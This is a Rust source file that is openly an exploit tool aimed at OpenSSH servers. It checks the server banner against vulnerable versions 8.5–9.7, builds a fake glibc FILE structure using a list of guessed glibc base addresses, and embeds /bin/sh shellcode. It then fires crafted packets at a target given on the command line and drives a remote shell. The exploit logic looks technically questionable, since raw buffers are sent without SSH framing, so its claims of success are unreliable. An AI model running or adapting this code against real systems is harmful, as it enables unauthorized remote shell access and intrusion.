use std::sync::Arc;
use tokio::sync::Mutex;
use std::env;
use std::io;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use colored::*;
use regex::Regex;
use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
use std::alloc::{alloc_zeroed, Layout};
use std::ptr;
use std::slice;

// Struct to match the FILE layout (used for heap manipulation)
#[repr(C, align(8))]
struct FakeFile {
    io_read_ptr: *mut u8,
    io_read_end: *mut u8,
    io_read_base: *mut u8,
    io_write_base: *mut u8,
    io_write_ptr: *mut u8,
    io_write_end: *mut u8,
    io_buf_base: *mut u8,
    io_buf_end: *mut u8,
    io_save_base: *mut u8,
    io_backup_base: *mut u8,
    io_save_end: *mut u8,
    markers: *mut u8,
    chain: *mut u8,
    fileno: i32,
    flags: i32,
    mode: i32,
    unused2: [u8; 40],
    vtable_offset: *mut u8,
}

// Function to allocate aligned memory for the buffer
fn allocate_aligned_buffer(size: usize, align: usize) -> *mut u8 {
    let layout = Layout::from_size_align(size, align).expect("Invalid layout");
    unsafe { alloc_zeroed(layout) as *mut u8 }
}

// Function to create the fake file structure (simulating the heap layout attack)
fn create_fake_file_structure(data: *mut u8, glibc_base: u64, size: usize) {
    // Clear the memory buffer
    unsafe { ptr::write_bytes(data, 0, size) };

    // Ensure the buffer has enough space for the FakeFile structure
    assert!(size >= std::mem::size_of::<FakeFile>());

    let fake_file_ptr = data as *mut FakeFile;

    unsafe {
        let fake_file = &mut *fake_file_ptr;

        // Simulate FILE structure
        fake_file.vtable_offset = 0x61 as *mut u8; // Set _vtable_offset to 0x61

        // Setup fake vtable and _codecvt pointers for 64-bit
        let fake_vtable = glibc_base + 0x21b740; // Example offset for _IO_wfile_jumps
        let fake_codecvt = glibc_base + 0x21d7f8; // Example offset for _codecvt

        // Set the fake vtable and codecvt pointers at the end of the data buffer
        let vtable_ptr = data.add(size - 16) as *mut u64;
        let codecvt_ptr = data.add(size - 8) as *mut u64;

        assert_eq!(vtable_ptr as usize % 8, 0, "vtable_ptr is not 8-byte aligned");
        assert_eq!(codecvt_ptr as usize % 8, 0, "codecvt_ptr is not 8-byte aligned");

        *vtable_ptr = fake_vtable;
        *codecvt_ptr = fake_codecvt;
    }
}

// GLIBC base addresses for ASLR bypass in 64-bit systems
const GLIBC_BASES: [u64; 10] = [
    0x00007f13d808dc20,
    0x7f13d808d000,
    0xb7200000,
    0xb7400000,
    0x7ffff7dd7000,
    0x7ffff7a0d000,
    0x7ffff7f50000,
    0x7ffff7dde000,
    0x7ffff7dcf000,
    0x7ffff7a26000,
];

// Shellcode to execute /bin/sh on 64-bit Linux
const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xc0,
    0x50,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x2f, 0x73, 0x68,
    0x53,
    0x48, 0x89, 0xe7,
    0x50,
    0x57,
    0x48, 0x89, 0xe6,
    0xb0, 0x3b,
    0x0f, 0x05,
];

// Struct to hold SSH target details
struct SshTarget {
    ip: String,
    port: u16,
}

// Function to grab SSH banner
async fn get_ssh_banner(stream: &mut OwnedReadHalf) -> io::Result<String> {
    let mut response = vec![0; 1024];
    let bytes_read = stream.read(&mut response).await?;
    if bytes_read > 0 {
        let banner = String::from_utf8_lossy(&response[0..bytes_read]).to_string();
        return Ok(banner);
    } else {
        return Ok("No response".to_string());
    }
}

// Function to send packets and trigger race condition
async fn send_packet(stream: &mut OwnedWriteHalf, packet: &[u8], packet_id: u32) -> io::Result<()> {
    println!("{}", format!("Sending packet #{}...", packet_id).green());
    stream.write_all(packet).await?;
    sleep(Duration::from_millis(50)).await;
    Ok(())
}

// Function to check response from the SSH server
async fn check_server_response(stream: Arc<Mutex<OwnedReadHalf>>) -> io::Result<bool> {
    let mut response = vec![0; 1024];
    let mut stream_guard = stream.lock().await;  // Locking read_half outside
    let bytes_read = stream_guard.read(&mut response).await?;

    if bytes_read > 0 {
        if &response[0..8] != b"SSH-2.0-" {
            println!("{}", "Possible race condition hit!".green().bold());
            Ok(true)
        } else {
            println!("{}", format!("SSH banner received: {:?}", String::from_utf8_lossy(&response)).cyan());
            Ok(false)
        }
    } else {
        println!("{}", "No response or zero bytes received from the server.".red());
        Ok(false)
    }
}

// Async function to simulate heap manipulation and attempt the exploit
async fn attempt_exploit(
    read_half: Arc<Mutex<OwnedReadHalf>>,
    write_half: Arc<Mutex<OwnedWriteHalf>>,
) -> io::Result<()> {
    let size = 4096;
    let align = 8;
    let buffer_ptr = allocate_aligned_buffer(size, align);

    for (i, &glibc_base) in GLIBC_BASES.iter().enumerate() {
        println!("{}", format!("Attempting exploit with glibc base: 0x{:x}", glibc_base).yellow());

        // Create the fake file structure on the heap
        create_fake_file_structure(buffer_ptr, glibc_base, size);

        // Embed the shellcode into the buffer
        unsafe {
            ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), buffer_ptr.add(size - SHELLCODE.len()), SHELLCODE.len());
        }

        // Send the crafted packet
        println!("{}", format!("Sending crafted exploit packet #{}...", i + 1).green());
        {
            let mut write_half_guard = write_half.lock().await;
            send_packet(&mut write_half_guard, unsafe { slice::from_raw_parts(buffer_ptr, size) }, (i + 1) as u32).await?;
        }

        // Check the server's response after each packet
        if let Ok(success) = check_server_response(read_half.clone()).await {
            if success {
                println!("{}", "Exploit succeeded.".green().bold());

                // Start interacting with the shell
                interact_with_shell(read_half.clone(), write_half.clone()).await?;

                return Ok(());
            }
        } else {
            println!("{}", "Exploit failed or no race condition detected.".red());
        }
    }

    println!("{}", "All exploit packets sent, but exploit failed.".red());
    Ok(())
}

// Function to check if the SSH version is vulnerable using a regex
fn is_vulnerable_version(banner: &str) -> bool {
    // Regex to match vulnerable OpenSSH versions (8.5 - 9.7)
    let re_vulnerable = Regex::new(r"SSH-2\.0-OpenSSH_(8\.[5-9]|9\.[0-7])").unwrap();

    // Regex to match non-exploitable OpenSSH versions
    let re_non_exploitable = Regex::new(
        r"(SSH-2\.0-OpenSSH_8\.9p1 Ubuntu-3ubuntu0\.10|\
        SSH-2\.0-OpenSSH_9\.3p1 Ubuntu-3ubuntu3\.6|\
        SSH-2\.0-OpenSSH_9\.6p1 Ubuntu-3ubuntu13\.3|\
        SSH-2\.0-OpenSSH_9\.3p1 Ubuntu-1ubuntu3\.6|\
        SSH-2\.0-OpenSSH_9\.2p1 Debian-2\+deb12u3|\
        SSH-2\.0-OpenSSH_8\.4p1 Debian-5\+deb11u3)"
    ).unwrap();

    if re_non_exploitable.is_match(banner) {
        println!("{}", "This version of OpenSSH is not exploitable.".blue());
        false
    } else if re_vulnerable.is_match(banner) {
        println!("{}", "This version of OpenSSH is vulnerable.".red());
        true
    } else {
        println!("{}", "This version of OpenSSH is unknown or not in the database.".yellow());
        false
    }
}

// Async function to interact with the shell after the exploit succeeds
async fn interact_with_shell(
    read_half: Arc<Mutex<OwnedReadHalf>>,
    write_half: Arc<Mutex<OwnedWriteHalf>>,
) -> io::Result<()> {
    println!("{}", "Interacting with shell...".yellow());

    let mut buffer = [0; 1024];

    loop {
        tokio::select! {
            // Read from the shell
            Some(bytes_read) = async {
                let mut read_half_guard = read_half.lock().await;
                let result = read_half_guard.read(&mut buffer).await;
                Some(result)
            } => {
                let bytes_read = bytes_read.unwrap_or_else(|e| {
                    eprintln!("Error reading from shell: {}", e);
                    return 0;
                });
                if bytes_read == 0 {
                    println!("Shell closed connection.");
                    break;
                }

                // Display output from the shell
                println!("{}", String::from_utf8_lossy(&buffer[..bytes_read]).green());
            },

            // Handle sending a command (e.g., "whoami")
            _ = sleep(Duration::from_secs(5)) => {
                let mut write_half_guard = write_half.lock().await;
                write_half_guard.write_all(b"whoami\n").await?;
            }
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() {
    // Get the IP and port from command-line arguments
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: cargo run <target_ip> <target_port>");
        return;
    }

    let target_ip = &args[1];
    let target_port = args[2].parse::<u16>().unwrap_or(22);

    let target = SshTarget {
        ip: target_ip.to_string(),
        port: target_port,
    };

    println!("{}", format!("Connecting to SSH server at {}:{}", target.ip, target.port).yellow());

    match TcpStream::connect(format!("{}:{}", target.ip, target.port)).await {
        Ok(stream) => {
            println!("{}", "Connected to the SSH server.".green());

            let (read_half, write_half) = stream.into_split();

            let read_half = Arc::new(Mutex::new(read_half));
            let write_half = Arc::new(Mutex::new(write_half));

            let banner = {
                let mut read_half_guard = read_half.lock().await;
                get_ssh_banner(&mut read_half_guard).await.unwrap_or_else(|e| {
                    eprintln!("Error getting SSH banner: {}", e);
                    String::new()
                })
            };

            println!("{}", format!("SSH Banner: {}", banner).blue());

            if is_vulnerable_version(&banner) {
                println!("{}", "Target is vulnerable. Proceeding with exploit...".yellow());

                if let Err(e) = attempt_exploit(read_half.clone(), write_half.clone()).await {
                    eprintln!("Error during exploit attempt: {}", e);
                } else {
                    println!("{}", "Exploit process completed.".green());
                }
            }
        }
        Err(e) => {
            eprintln!("{}", format!("Failed to connect to SSH server: {e}").red());
        }
    }
}
